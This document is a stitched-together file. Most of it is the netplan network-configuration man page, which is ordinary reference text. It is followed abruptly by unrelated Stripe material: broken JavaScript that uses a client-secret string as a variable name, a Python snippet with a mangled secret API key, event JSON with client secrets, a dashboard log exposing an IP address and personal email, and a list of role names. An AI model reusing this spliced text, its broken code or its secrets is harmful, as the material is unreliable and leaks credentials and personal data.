              NetworkManager backend, enabling link-local has no effect if the interface also has
              DHCP enabled.

              Example to enable only IPv4 link-local: link-local: [ ipv4 ] Example to enable  all
              link-local  addresses: link-local: [ ipv4, ipv6 ] Example to disable all link-local
              addresses: link-local: [ ]

       critical (bool)
              (networkd backend only) Designate the  connection  as  "critical  to  the  system",
              meaning  that  special  care  will  be taken by systemd-networkd to not release the
              assigned IP when the daemon is restarted.

       dhcp-identifier (scalar)
              When set to 'mac'; pass that setting over to systemd-networkd to use  the  device's
              MAC address as a unique identifier rather than a RFC4361-compliant Client ID.  This
              has no effect when NetworkManager is used as a renderer.

       dhcp4-overrides (mapping)
              (networkd backend only) Overrides default DHCP  behavior;  see  the  DHCP Overrides
              section below.

       dhcp6-overrides (mapping)
              (networkd  backend  only)  Overrides  default DHCP behavior; see the DHCP Overrides
              section below.

       accept-ra (bool)
              Accept Router Advertisement that would have the kernel configure  IPv6  by  itself.
              When  enabled,  accept  Router  Advertisements.   When  disabled, do not respond to
              Router Advertisements.  If unset use the host kernel default setting.

       addresses (sequence of scalars)
              Add static addresses to the interface in addition to the ones received through DHCP
              or   RA.    Each  sequence  entry  is  in  CIDR  notation,  i.   e.   of  the  form
              addr/prefixlen.  addr is an IPv4 or IPv6 address as recognized by inet_pton(3)  and
              prefixlen the number of bits of the subnet.

              For  virtual  devices  (bridges, bonds, vlan) if there is no address configured and
              DHCP is disabled, the interface may still  be  brought  online,  but  will  not  be
              addressable from the network.

              Example: addresses: [192.168.14.2/24, "2001:1::1/64"]

       ipv6-address-generation (scalar)
              Configure  method  for  creating  the  address  for use with RFC4862 IPv6 Stateless
              Address Autoconfiguration.  Possible values are eui64 or stable-privacy.

       gateway4, gateway6 (scalar)
              Set default gateway for IPv4/6, for manual address  configuration.   This  requires
              setting addresses too.  Gateway IPs must be in a form recognized by inet_pton(3).

              Example for IPv4: gateway4: 172.16.0.1 Example for IPv6: gateway6: "2001:4::1"

       nameservers (mapping)
              Set  DNS  servers  and search domains, for manual address configuration.  There are
              two supported fields: addresses: is a list of IPv4 or  IPv6  addresses  similar  to
              gateway*, and search: is a list of search domains.

              Example:

                     ethernets:
                       id0:
                         [...]
                         nameservers:
                           search: [lab, home]
                           addresses: [8.8.8.8, "FEDC::1"]

       macaddress (scalar)
              Set   the   device's   MAC   address.    The  MAC  address  must  be  in  the  form
              "XX:XX:XX:XX:XX:XX".

              Note: This will not work reliably for devices matched by name only and rendered  by
              networkd,  due  to interactions with device renaming in udev.  Match devices by MAC
              when setting MAC addresses.

              Example:

                     ethernets:
                       id0:
                         match:
                           macaddress: 52:54:00:6b:3c:58
                         [...]
                         macaddress: 52:54:00:6b:3c:59

       mtu (scalar)
              Set the Maximum Transmission Unit for the interface.  The default is  1500.   Valid
              values depend on your network interface.

              Note:  This will not work reliably for devices matched by name only and rendered by
              networkd, due to interactions with device renaming in udev.  Match devices  by  MAC
              when setting MTU.

       optional (bool)
              An  optional device is not required for booting.  Normally, networkd will wait some
              time for device to become configured before proceeding with booting.  However, if a
              device  is  marked  as  optional,  networkd  will  not  wait  for it.  This is only
              supported by networkd, and the default is false.

              Example:

                     ethernets:
                       eth7:
                         # this is plugged into a test network that is often
                         # down - don't wait for it to come up during boot.
                         dhcp4: true
                         optional: true

       optional-addresses (sequence of scalars)
              Specify types of addresses that are not required for  a  device  to  be  considered
              online.   This  changes  the behavior of backends at boot time to avoid waiting for
              addresses that are marked optional, and thus consider  the  interface  as  "usable"
              sooner.  This does not disable these addresses, which will be brought up anyway.

              Example:

                     ethernets:
                       eth7:
                         dhcp4: true
                         dhcp6: true
                         optional-addresses: [ ipv4-ll, dhcp6 ]

       routes (mapping)
              Configure static routing for the device; see the Routing section below.

       routing-policy (mapping)
              Configure policy routing for the device; see the Routing section below.

   DHCP Overrides
       Several  DHCP  behavior overrides are available.  Most currently only have any effect when
       using the networkd backend, with the exception of use-routes and route-metric.

       Overrides only have an effect if the corresponding dhcp4 or dhcp6 is set to true.

       If both dhcp4 and dhcp6 are true, the networkd backend requires that  dhcp4-overrides  and
       dhcp6-overrides  contain  the  same keys and values.  If the values do not match, an error
       will be shown and the network configuration will not be applied.

       When  using  the  NetworkManager  backend,  different  values   may   be   specified   for
       dhcp4-overrides  and  dhcp6-overrides, and will be applied to the DHCP client processes as
       specified in the netplan YAML.

       : The dhcp4-overrides and dhcp6-overrides mappings override the default DHCP behavior.

               ``use-dns`` (bool)
               :    Default: ``true``. When ``true``, the DNS servers received from the
                    DHCP server will be used and take precedence over any statically
                    configured ones. Currently only has an effect on the ``networkd``
                    backend.

               ``use-ntp`` (bool)
               :    Default: ``true``. When ``true``, the NTP servers received from the
                    DHCP server will be used by systemd-timesyncd and take precedence
                    over any statically configured ones. Currently only has an effect on
                    the ``networkd`` backend.

               ``send-hostname`` (bool)
               :    Default: ``true``. When ``true``, the machine's hostname will be sent
                    to the DHCP server. Currently only has an effect on the ``networkd``
                    backend.

               ``use-hostname`` (bool)
               :    Default: ``true``. When ``true``, the hostname received from the DHCP
                    server will be set as the transient hostname of the system. Currently
                    only has an effect on the ``networkd`` backend.

               ``use-mtu`` (bool)
               :    Default: ``true``. When ``true``, the MTU received from the DHCP
                    server will be set as the MTU of the network interface. When ``false``,
                    the MTU advertised by the DHCP server will be ignored. Currently only
                    has an effect on the ``networkd`` backend.

               ``hostname`` (scalar)
               :    Use this value for the hostname which is sent to the DHCP server,
                    instead of machine's hostname. Currently only has an effect on the
                    ``networkd`` backend.

               ``use-routes`` (bool)
               :    Default: ``true``. When ``true``, the routes received from the DHCP
                    server will be installed in the routing table normally. When set to
                    ``false``, routes from the DHCP server will be ignored: in this case,
                    the user is responsible for adding static routes if necessary for
                    correct network operation. This allows users to avoid installing a
                    default gateway for interfaces configured via DHCP. Available for
                    both the ``networkd`` and ``NetworkManager`` backends.

               ``route-metric`` (scalar)
               :    Use this value for default metric for automatically-added routes.
                    Use this to prioritize routes for devices by setting a higher metric
                    on a preferred interface. Available for both the ``networkd`` and
                    ``NetworkManager`` backends.

               ``use-domains`` (scalar)
               :    Takes a boolean, or the special value "route". When true, the domain
                    name received from the DHCP server will be used as DNS search domain
                    over this link, similar to the effect of the Domains= setting. If set
                    to "route", the domain name received from the DHCP server will be
                    used for routing DNS queries only, but not for searching, similar to
                    the effect of the Domains= setting when the argument is prefixed with
                    "~".

                    **Requires feature: dhcp-use-domains**

   Routing
       Complex routing is possible with netplan.   Standard  static  routes  as  well  as  policy
       routing using routing tables are supported via the networkd backend.

       These options are available for all types of interfaces.

       routes (mapping)
              The  routes block defines standard static routes for an interface.  At least to and
              via must be specified.

              For from, to, and via, both IPv4 and IPv6 addresses are recognized, and must be  in
              the form addr/prefixlen or addr.

              from (scalar)
                     Set a source IP address for traffic going through the route.

              to (scalar)
                     Destination address for the route.

              via (scalar)
                     Address to the gateway to use for this route.

              on-link (bool)
                     When  set  to  "true", specifies that the route is directly connected to the
                     interface.

              metric (scalar)
                     The relative priority of the route.  Must be a positive integer value.

              type (scalar)
                     The type of route.  Valid options are  "unicast"  (default),  "unreachable",
                     "blackhole" or "prohibit".

              scope (scalar)
                     The route scope, how wide-ranging it is to the network.  Possible values are
                     "global", "link", or "host".

              table (scalar)
                     The table number to use for the route.  In some scenarios, it may be  useful
                     to  set routes in a separate routing table.  It may also be used to refer to
                     routing policy rules which also accept a table  parameter.   Allowed  values
                     are  positive  integers  starting from 1.  Some values are already in use to
                     refer to specific routing tables: see /etc/iproute2/rt_tables.

       routing-policy (mapping)
              The routing-policy block defines extra routing policy for a network, where  traffic
              may be handled specially based on the source IP, firewall marking, etc.

              For  from, to, both IPv4 and IPv6 addresses are recognized, and must be in the form
              addr/prefixlen or addr.

              from (scalar)
                     Set a source IP address to match traffic for this policy rule.

              to (scalar)
                     Match on traffic going to the specified destination.

              table (scalar)
                     The table number to match for the route.   In  some  scenarios,  it  may  be
                     useful  to  set  routes in a separate routing table.  It may also be used to
                     refer to routes which also accept a table  parameter.   Allowed  values  are
                     positive  integers starting from 1.  Some values are already in use to refer
                     to specific routing tables: see /etc/iproute2/rt_tables.

              priority (scalar)
                     Specify a priority for the routing policy rule, to influence  the  order  in
                     which  routing  rules  are processed.  A higher number means lower priority:
                     rules are processed in order by increasing priority number.

              mark (scalar)
                     Have this routing policy rule match on traffic that has been marked  by  the
                     iptables  firewall  with  this  value.  Allowed values are positive integers
                     starting from 1.

              type-of-service (scalar)
                     Match this policy rule based on the type of service number  applied  to  the
                     traffic.

   Authentication
       Netplan  supports  advanced  authentication  settings for ethernet and wifi interfaces, as
       well as individual wifi networks, by means of the auth block.

       auth (mapping)
              Specifies  authentication  settings  for  a  device  of  type  ethernets:,  or   an
              access-points: entry on a wifis: device.

              The auth block supports the following properties:

              key-management (scalar)
                     The  supported  key  management modes are none (no key management); psk (WPA
                     with pre-shared key, common for home wifi); eap (WPA with  EAP,  common  for
                     enterprise   wifi);   and   802.1x   (used   primarily  for  wired  Ethernet
                     connections).

              password (scalar)
                     The password string for EAP, or the pre-shared key for WPA-PSK.

              The following properties can be used if key-management is eap or 802.1x:

              method (scalar)
                     The EAP method to use.  The  supported  EAP  methods  are  tls  (TLS),  peap
                     (Protected EAP), and ttls (Tunneled TLS).

              identity (scalar)
                     The identity to use for EAP.

              anonymous-identity (scalar)
                     The  identity  to pass over the unencrypted channel if the chosen EAP method
                     supports passing a different tunnelled identity.

              ca-certificate (scalar)
                     Path to  a  file  with  one  or  more  trusted  certificate  authority  (CA)
                     certificates.

              client-certificate (scalar)
                     Path  to  a  file containing the certificate to be used by the client during
                     authentication.

              client-key (scalar)
                     Path   to   a   file   containing   the   private   key   corresponding   to
                     client-certificate.

              client-key-password (scalar)
                     Password  to use to decrypt the private key specified in client-key if it is
                     encrypted.

              phase2-auth (scalar)
                     Phase 2 authentication mechanism.

   Properties for device type ethernets:
       Ethernet device definitions,  beyond  common  ones  described  above,  also  support  some
       additional properties that can be used for SR-IOV devices.

       link (scalar)
              (SR-IOV  devices  only) The link property declares the device as a Virtual Function
              of the selected Physical Function device, as identified by the given netplan id.

       Example:

              ethernets:
                enp1: {...}
                enp1s16f1:
                  link: enp1

       virtual-function-count (scalar)
              (SR-IOV devices only) In certain special cases VFs  might  need  to  be  configured
              outside   of  netplan.   For  such  configurations  virtual-function-count  can  be
              optionally used to set an explicit  number  of  Virtual  Functions  for  the  given
              Physical  Function.   If  unset,  the  default is to create only as many VFs as are
              defined in the netplan configuration.  This should be used for special cases only.

   Properties for device type modems:
       GSM/CDMA  modem  configuration  is  only  supported  for   the   NetworkManager   backend.
       systemd-networkd does not support modems.

       apn (scalar)
              Set  the  carrier  APN  (Access Point Name).  This can be omitted if auto-config is
              enabled.

       auto-config (bool)
              Specify whether to try and autoconfigure the modem by doing a lookup of the carrier
              against  the  Mobile  Broadband  Provider  database.   This  may  not  work for all
              carriers.

       device-id (scalar)
              Specify the device ID (as given by the WWAN management service)  of  the  modem  to
              match.  This can be found using mmcli.

       network-id (scalar)
              Specify the Network ID (GSM LAI format).  If this is specified, the device will not
              roam networks.

       number (scalar)
              The number to dial to establish the connection to  the  mobile  broadband  network.
              (Deprecated for GSM)

       password (scalar)
              Specify  the  password  used to authenticate with the carrier network.  This can be
              omitted if auto-config is enabled.

       pin (scalar)
              Specify the SIM PIN to allow it to operate if a PIN is set.

       sim-id (scalar)
              Specify the SIM unique identifier (as given by the WWAN management  service)  which
              this connection applies to.  If given, the connection will apply to any device also
              allowed by device-id which contains a SIM card matching the given identifier.

       sim-operator-id (scalar)
              Specify the MCC/MNC string (such as  "310260"  or  "21601")  which  identifies  the
              carrier  that this connection should apply to.  If given, the connection will apply
              to any device also allowed by device-id  and  sim-id  which  contains  a  SIM  card
              provisioned by the given operator.

       username (scalar)
              Specify  the  username  used  to authentiate with the carrier network.  This can be
              omitted if auto-config is enabled.

   Properties for device type wifis:
       Note that systemd-networkd does not natively  support  wifi,  so  you  need  wpasupplicant
       installed if you let the networkd renderer handle wifi.

       access-points (mapping)
              This provides pre-configured connections to NetworkManager.  Note that users can of
              course select other access points/SSIDs.  The keys of the mapping  are  the  SSIDs,
              and the values are mappings with the following supported properties:

              password (scalar)
                     Enable  WPA2  authentication and set the passphrase for it.  If neither this
                     nor an auth block are given, the network is assumed to be open.  The setting

                              password: "S3kr1t"

                     is equivalent to

                              auth:
                                key-management: psk
                                password: "S3kr1t"

              mode (scalar)
                     Possible access point modes are infrastructure (the default), ap (create  an
                     access  point  to  which other devices can connect), and adhoc (peer to peer
                     networks without a  central  access  point).   ap  is  only  supported  with
                     NetworkManager.

              bssid (scalar)
                     If  specified,  directs  the  device to only associate with the given access
                     point.

              band (scalar)
                     Possible bands are 5GHz (for 5GHz 802.11a) and 2.4GHz (for  2.4GHz  802.11),
                     do  not  restrict  the  802.11  frequency  band of the network if unset (the
                     default).

              channel (scalar)
                     Wireless channel to use for the Wi-Fi connection.  Because  channel  numbers
                     overlap  between bands, this property takes effect only if the band property
                     is also set.

       wakeonwlan (sequence of scalars)
              This enables WakeOnWLan on supported devices.  Not all drivers support all options.
              May   be   any   combination  of  any,  disconnect,  magic_pkt,  gtk_rekey_failure,
              eap_identity_req, four_way_handshake, rfkill_release or tcp (NetworkManager  only).
              Or the exclusive default flag (the default).

   Properties for device type bridges:
       interfaces (sequence of scalars)
              All  devices  matching  this  ID  list will be added to the bridge.  This may be an
              empty list, in which case  the  bridge  will  be  brought  online  with  no  member
              interfaces.

              Example:

                       ethernets:
                         switchports:
                           match: {name: "enp2*"}
                       [...]
                       bridges:
                         br0:
                           interfaces: [switchports]

       parameters (mapping)
              Customization  parameters for special bridging options.  Time intervals may need to
              be expressed as a number of seconds or milliseconds:  the  default  value  type  is
              specified below.  If necessary, time intervals can be qualified using a time suffix
              (such as "s" for seconds, "ms" for milliseconds) to allow for more control over its
              behavior.

              ageing-time (scalar)
                     Set  the  period  of  time  to keep a MAC address in the forwarding database
                     after a packet is received.  This maps to the AgeingTimeSec=  property  when
                     the  networkd  renderer  is used.  If no time suffix is specified, the value
                     will be interpreted as seconds.

              priority (scalar)
                     Set the priority value for the  bridge.   This  value  should  be  a  number
                     between  0  and  65535.  Lower values mean higher priority.  The bridge with
                     the higher priority will be elected as the root bridge.

              port-priority (scalar)
                     Set the port priority to .  The priority value is a number between 0 and 63.
                     This  metric  is  used  in  the  designated  port  and  root  port selection
                     algorithms.

              forward-delay (scalar)
                     Specify the period of time the bridge will remain in Listening and  Learning
                     states  before  getting  to  the  Forwarding  state.  This field maps to the
                     ForwardDelaySec= property for the networkd renderer.  If no time  suffix  is
                     specified, the value will be interpreted as seconds.

              hello-time (scalar)
                     Specify  the interval between two hello packets being sent out from the root
                     and designated bridges.  Hello packets  communicate  information  about  the
                     network  topology.   When  the  networkd  renderer is used, this maps to the
                     HelloTimeSec= property.  If no time suffix is specified, the value  will  be
                     interpreted as seconds.

              max-age (scalar)
                     Set  the  maximum  age of a hello packet.  If the last hello packet is older
                     than that value, the bridge will attempt to become the  root  bridge.   This
                     maps  to  the MaxAgeSec= property when the networkd renderer is used.  If no
                     time suffix is specified, the value will be interpreted as seconds.

              path-cost (scalar)
                     Set the cost of a path on the bridge.  Faster interfaces should have a lower
                     cost.   This  allows  a  finer  control  on the network topology so that the
                     fastest paths are available whenever possible.

              stp (bool)
                     Define whether the bridge should use Spanning Tree  Protocol.   The  default
                     value is "true", which means that Spanning Tree should be used.

   Properties for device type bonds:
       interfaces (sequence of scalars)
              All devices matching this ID list will be added to the bond.

              Example:

                       ethernets:
                         switchports:
                           match: {name: "enp2*"}
                       [...]
                       bonds:
                         bond0:
                           interfaces: [switchports]

       parameters (mapping)
              Customization  parameters  for special bonding options.  Time intervals may need to
              be expressed as a number of seconds or milliseconds:  the  default  value  type  is
              specified below.  If necessary, time intervals can be qualified using a time suffix
              (such as "s" for seconds, "ms" for milliseconds) to allow for more control over its
              behavior.

              mode (scalar)
                     Set  the  bonding  mode  used for the interfaces.  The default is balance-rr
                     (round robin).  Possible values are balance-rr, active-backup,  balance-xor,
                     broadcast, 802.3ad, balance-tlb, and balance-alb.

              lacp-rate (scalar)
                     Set  the  rate  at  which  LACPDUs  are transmitted.  This is only useful in
                     802.3ad mode.  Possible values are slow  (30  seconds,  default),  and  fast
                     (every second).

              mii-monitor-interval (scalar)
                     Specifies  the interval for MII monitoring (verifying if an interface of the
                     bond has carrier).  The default is 0; which disables MII  monitoring.   This
                     is  equivalent  to the MIIMonitorSec= field for the networkd backend.  If no
                     time suffix is specified, the value will be interpreted as milliseconds.

              min-links (scalar)
                     The minimum number of links up in a bond to consider the bond  interface  to
                     be up.

              transmit-hash-policy (scalar)
                     Specifies  the  transmit  hash  policy for the selection of slaves.  This is
                     only useful in balance-xor, 802.3ad and balance-tlb modes.  Possible  values
                     are layer2, layer3+4, layer2+3, encap2+3, and encap3+4.

              ad-select (scalar)
                     Set  the aggregation selection mode.  Possible values are stable, bandwidth,
                     and count.  This option is only used in 802.3ad mode.

              all-slaves-active (bool)
                     If the bond should drop duplicate frames received  on  inactive  ports,  set
                     this option to false.  If they should be delivered, set this option to true.
                     The  default  value  is  false,  and  is  the  desirable  behavior  in  most
                     situations.

              arp-interval (scalar)
                     Set the interval value for how frequently ARP link monitoring should happen.
                     The default value is 0, which disables ARP  monitoring.   For  the  networkd
                     backend,  this  maps  to the ARPIntervalSec= property.  If no time suffix is
                     specified, the value will be interpreted as milliseconds.

              arp-ip-targets (sequence of scalars)
                     IPs of other hosts on the link which should be sent ARP requests in order to
                     validate  that a slave is up.  This option is only used when arp-interval is
                     set to a value other than 0.  At least one IP address must be given for  ARP
                     link  monitoring  to  function.  Only IPv4 addresses are supported.  You can
                     specify up to 16 IP addresses.  The default value is an empty list.

              arp-validate (scalar)
                     Configure  how  ARP  replies  are  to  be  validated  when  using  ARP  link
                     monitoring.  Possible values are none, active, backup, and all.

              arp-all-targets (scalar)
                     Specify  whether to use any ARP IP target being up as sufficient for a slave
                     to be considered up; or if all the targets must be up.  This  is  only  used
                     for  active-backup  mode  when arp-validate is enabled.  Possible values are
                     any and all.

              up-delay (scalar)
                     Specify the delay before enabling a link once the  link  is  physically  up.
                     The  default  value  is  0.   This  maps to the UpDelaySec= property for the
                     networkd renderer.  This option is only valid for the miimon  link  monitor.
                     If   no  time  suffix  is  specified,  the  value  will  be  interpreted  as
                     milliseconds.

              down-delay (scalar)
                     Specify the delay before disabling a link once the link has been lost.   The
                     default  value  is  0.   This  maps  to  the  DownDelaySec= property for the
                     networkd renderer.  This option is only valid for the miimon  link  monitor.
                     If   no  time  suffix  is  specified,  the  value  will  be  interpreted  as
                     milliseconds.

              fail-over-mac-policy (scalar)
                     Set whether to set all slaves to the same MAC address when  adding  them  to
                     the  bond, or how else the system should handle MAC addresses.  The possible
                     values are none, active, and follow.

              gratuitous-arp (scalar)
                     Specify how many ARP packets to send after failover.  Once a link is up on a
                     new slave, a notification is sent and possibly repeated if this value is set
                     to a number greater than 1.  The default value is 1  and  valid  values  are
                     between 1 and 255.  This only affects active-backup mode.

                     For historical reasons, the misspelling gratuitious-arp is also accepted and
                     has the same function.

              packets-per-slave (scalar)
                     In balance-rr mode, specifies the number of packets to transmit on  a  slave
                     before  switching  to  the  next.   When  this value is set to 0, slaves are
                     chosen at random.  Allowable values are between 0 and  65535.   The  default
                     value is 1.  This setting is only used in balance-rr mode.

              primary-reselect-policy (scalar)
                     Set  the reselection policy for the primary slave.  On failure of the active
                     slave, the system will use this policy to decide how the  new  active  slave
                     will  be  chosen  and how recovery will be handled.  The possible values are
                     always, better, and failure.

              resend-igmp (scalar)
                     In modes balance-rr, active-backup, balance-tlb and balance-alb, a  failover
                     can switch IGMP traffic from one slave to another.

                     This  parameter  specifies  how many IGMP membership reports are issued on a
                     failover event.  Values range from 0 to 255.  0 disables sending  membership
                     reports.   Otherwise,  the  first  membership report is sent on failover and
                     subsequent reports are sent at 200ms intervals.

              learn-packet-interval (scalar)
                     Specify the interval between sending learning packets to  each  slave.   The
                     value  range  is  between  1  and 0x7fffffff.  The default value is 1.  This
                     option only affects balance-tlb and balance-alb modes.  Using  the  networkd
                     renderer,  this  field  maps to the LearnPacketIntervalSec= property.  If no
                     time suffix is specified, the value will be interpreted as seconds.

              primary (scalar)
                     Specify a device to be used as a primary slave, or preferred device  to  use
                     as  a  slave  for the bond (ie.  the preferred device to send data through),
                     whenever it is available.  This only affects active-backup, balance-alb, and
                     balance-tlb modes.

   Properties for device type tunnels:
       Tunnels  allow  traffic  to  pass  as if it was between systems on the same local network,
       although systems may be far from each other but reachable via the Internet.  They  may  be
       used  to  support IPv6 traffic on a network where the ISP does not provide the service, or
       to    extend    and     "connect"     separate     local     networks.      Please     see
       https://en.wikipedia.org/wiki/Tunneling_protocol   for   more  general  information  about
       tunnels.

       mode (scalar)
              Defines the tunnel mode.  Valid options are sit, gre, ip6gre, ipip, ipip6,  ip6ip6,
              vti,  and  vti6.   Additionally,  the  networkd  backend  also  supports gretap and
              ip6gretap modes.  In addition, the NetworkManager backend supports isatap tunnels.

       local (scalar)
              Defines the address of the local endpoint of the tunnel.

       remote (scalar)
              Defines the address of the remote endpoint of the tunnel.

       key (scalar or mapping)
              Define keys to use for the tunnel.  The key can be a number or a  dotted  quad  (an
              IPv4  address).   It  is  used  for  identification of IP transforms.  This is only
              required for vti and vti6 when using the networkd backend, and for  gre  or  ip6gre
              tunnels when using the NetworkManager backend.

              This  field  may be used as a scalar (meaning that a single key is specified and to
              be used for both input and output key), or as a mapping, where you can then further
              specify input and output.

              input (scalar)
                     The input key for the tunnel

              output (scalar)
                     The output key for the tunnel

       Examples:

              tunnels:
                tun0:
                  mode: gre
                  local: ...
                  remote: ...
                  keys:
                    input: 1234
                    output: 5678

              tunnels:
                tun0:
                  mode: vti6
                  local: ...
                  remote: ...
                  key: 59568549

       keys (scalar or mapping)
              Alternate name for the key field.  See above.

   Properties for device type vlans:
       id (scalar)
              VLAN ID, a number between 0 and 4094.

       link (scalar)
              netplan ID of the underlying device definition on which this VLAN gets created.

       Example:

              ethernets:
                eno1: {...}
              vlans:
                en-intra:
                  id: 1
                  link: eno1
                  dhcp4: yes
                en-vpn:
                  id: 2
                  link: eno1
                  addresses: ...

   Backend-specific configuration parameters
       In  addition  to  the  other  fields  available to configure interfaces, some backends may
       require to record some of their own parameters  in  netplan,  especially  if  the  netplan
       definitions  are generated automatically by the consumer of that backend.  Currently, this
       is only used with NetworkManager.

       networkmanager (mapping)
              Keeps the NetworkManager-specific configuration parameters used by  the  daemon  to
              recognize connections.

              name (scalar)
                     Set the display name for the connection.

              uuid (scalar)
                     Defines  the  UUID  (unique identifier) for this connection, as generated by
                     NetworkManager itself.

              stable-id (scalar)
                     Defines the stable ID (a different  form  of  a  connection  name)  used  by
                     NetworkManager  in  case  the name of the connection might otherwise change,
                     such as when sharing connections between users.

              device (scalar)
                     Defines the interface name for which this connection applies.

   Examples
       Configure an ethernet device with networkd, identified by its name, and enable DHCP:

              network:
                version: 2
                ethernets:
                  eno1:
                    dhcp4: true

       This is an example of a static-configured  interface  with  multiple  IPv4  addresses  and
       multiple  gateways  with  networkd,  with  equal  route  metric  levels,  and  static  DNS
       nameservers (Google DNS for this example):

              network:
                version: 2
                renderer: networkd
                ethernets:
                  eno1:
                    addresses:
                    - 10.0.0.10/24
                    - 11.0.0.11/24
                    nameservers:
                      addresses:
                        - 8.8.8.8
                        - 8.8.4.4
                    routes:
                    - to: 0.0.0.0/0
                      via: 10.0.0.1
                      metric: 100
                    - to: 0.0.0.0/0
                      via: 11.0.0.1
                      metric: 100

       This is a complex example which shows most available features:

              network:
                version: 2
                # if specified, can only realistically have that value, as networkd cannot
                # render wifi/3G.
                renderer: NetworkManager
                ethernets:
                  # opaque ID for physical interfaces, only referred to by other stanzas
                  id0:
                    match:
                      macaddress: 00:11:22:33:44:55
                    wakeonlan: true
                    dhcp4: true
                    addresses:
                      - 192.168.14.2/24
                      - 192.168.14.3/24
                      - "2001:1::1/64"
                    gateway4: 192.168.14.1
                    gateway6: "2001:1::2"
                    nameservers:
                      search: [foo.local, bar.local]
                      addresses: [8.8.8.8]
                    routes:
                      - to: 0.0.0.0/0
                        via: 11.0.0.1
                        table: 70
                        on-link: true
                        metric: 3
                    routing-policy:
                      - to: 10.0.0.0/8
                        from: 192.168.14.2/24
                        table: 70
                        priority: 100
                      - to: 20.0.0.0/8
                        from: 192.168.14.3/24
                        table: 70
                        priority: 50
                    # only networkd can render on-link routes and routing policies
                    renderer: networkd
                  lom:
                    match:
                      driver: ixgbe
                    # you are responsible for setting tight enough match rules
                    # that only match one device if you use set-name
                    set-name: lom1
                    dhcp6: true
                  switchports:
                    # all cards on second PCI bus unconfigured by
                    # themselves, will be added to br0 below
                    # note: globbing is not supported by NetworkManager
                    match:
                      name: enp2*
                    mtu: 1280
                wifis:
                  all-wlans:
                    # useful on a system where you know there is
                    # only ever going to be one device
                    match: {}
                    access-points:
                      "Joe's home":
                        # mode defaults to "infrastructure" (client)
                        password: "s3kr1t"
                  # this creates an AP on wlp1s0 using hostapd
                  # no match rules, thus the ID is the interface name
                  wlp1s0:
                    access-points:
                      "guest":
                         mode: ap
                         # no WPA config implies default of open
                bridges:
                  # the key name is the name for virtual (created) interfaces
                  # no match: and set-name: allowed
                  br0:
                    # IDs of the components; switchports expands into multiple interfaces
                    interfaces: [wlp1s0, switchports]
                    dhcp4: true

  if (elements == null) {
  return;
}

// Trigger form validation and wallet collection
const {error: submitError} = await elements.submit();
if (submitError) {
  // Show error to your customer
  setErrorMessage(submitError.message);
  return;
}

// Create the PaymentIntent and obtain clientSecret from your server endpoint
const res = await fetch('/create-intent', {
  method: 'POST',
});

const {client_secret: seti_1NG8Du2eZvKYlo2C9XMqbR0x_secret_O2CdhLwGFh2Aej7bCY7qp8jlIuyR8DJ} = await res.json();

const {error} = await stripe.confirmPayment({
  //`Elements` instance that was used to create the Payment Element
  elements,
  clientSecret,
  confirmParams: {
    return_url: 'https://example.com/order/123/complete',
  },
});

if (error) {
  // This point will only be reached if there is an immediate error when
  // confirming the payment. Show error to your customer (for example, payment
  // details incomplete)
  setErrorMessage(error.message);
} else {
  // Your customer will be redirected to your `return_url`. For some payment
  // methods like iDEAL, your customer will be redirected to an intermediate
  // site first to authorize the payment, then redirected to the `return_url`.
}
import stripe
stripe.api_key = "sk_test_51OR5eP...OF00CdDfT6Xqsk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq"
stripe.Event.list(limit=3)
RESPONSE
{
  "object": "list",
  "url": "/v1/events",
  "has_more": false,
  "data": [
    {
      "id": "evt_1NG8Du2eZvKYlo2CUI79vXWy",
      "object": "event",
      "api_version": "2019-02-19",
      "created": 1686089970,
      "data": {
        "object": {
          "id": "seti_1NG8Du2eZvKYlo2C9XMqbR0x",
          "object": "setup_intent",
          "application": null,
          "automatic_payment_methods": null,
          "cancellation_reason": null,
          "client_secret": "seti_1NG8Du2eZvKYlo2C9XMqbR0x_secret_O2CdhLwGFh2Aej7bCY7qp8jlIuyR8DJ",
          "created": 1686089970,
          "customer": null,
          "description": null,
          "flow_directions": null,
          "last_setup_error": null,
          "latest_attempt": null,
          "livemode": false,
          "mandate": null,
          "metadata": {},
          "next_action": null,
          "on_behalf_of": null,
          "payment_method": "pm_1NG8Du2eZvKYlo2CYzzldNr7",
          "payment_method_options": {
            "acss_debit": {
              "currency": "cad",
              "mandate_options": {
                "interval_description": "First day of every month",
                "payment_schedule": "interval",
                "transaction_type": "personal"
              },
              "verification_method": "automatic"
            }
          },
          "payment_method_types": [
            "acss_debit"
          ],
          "single_use_mandate": null,
          "status": "requires_confirmation",
          "usage": "off_session"
        }
      },
      "livemode": false,
      "pending_webhooks": 0,
      "request": {
        "id": null,
        "idempotency_key": null
      },
      "type": "setup_intent.created"
    }
    {...}
    {...}
  ],
}

  OK
ID
req_ZIIVfKfNp6QrOh
Time
12/27/23, 8:29:28 PM
IP address
73.44.108.236 (from server at 73.44.108.236)
API version
2023-08-16
Latest
Source
Dashboard — grateful345i@gmail.com
Idempotency
Key — 6f5410cb-1ecc-4302-8130-baf8dd8c0a50

Origin
https://dashboard.stripe.com/
Response body
{
  "id": "prod_PFteovqxmPdK9u"
}
Request query parameters
{
  "include_only": [
    "id"
  ]
}
Request POST body
{
  "statement_descriptor": "Foundation Overseer ",
  "unit_label": "US-dollar "
}
stripe.collectFinancialConnectionsAccounts({
  clientSecret: '{fcsess_client_secret_KRJTKvCY3IKoYTrW18EazcO3}'
})
  .then(function(result) {
    if (result.error) {
      // Inform the customer that there was an error.
      console.log(result.error.message);

    // Handle next step based on length of accounts array
    } else if (result.financialConnectionsSession.accounts.length === 0) {
      console.log('No accounts were linked');
    } else {
      console.log(result.financialConnectionsSession.accounts)
    }
  });

{
  "object": "customer_session",
  "client_secret": "_POpxYpmkXdtttYtZQYhrsOJZ2RCQ9kCqqXRU6qrP5c4Jgje",
  "components": {
    "buy_button": {
      "enabled": false
    },
    "pricing_table": {
      "enabled": true
    }
  },
  "customer": "cus_PO34b57IOUb83c",
  "expires_at": 1684790027,
  "livemode": false
} {
  "object": "customer_session",
  "client_secret": "_POpxYpmkXdtttYtZQYhrsOJZ2RCQ9kCqqXRU6qrP5c4Jgje",
  "components": {
    "buy_button": {
      "enabled": false
    },
    "pricing_table": {
      "enabled": true
    }
  },
  "customer": "cus_PO34b57IOUb83c",
  "expires_at": 1684790027,
  "livemode": false
}
  topup_specialist

financial_connections_specialist

data_migration_specialist

dispute_analyst

dispute_analyst

issuing_support_agent

identity_view_only

identity_analyst

developer

transfer_analyst

iam_admin

admin

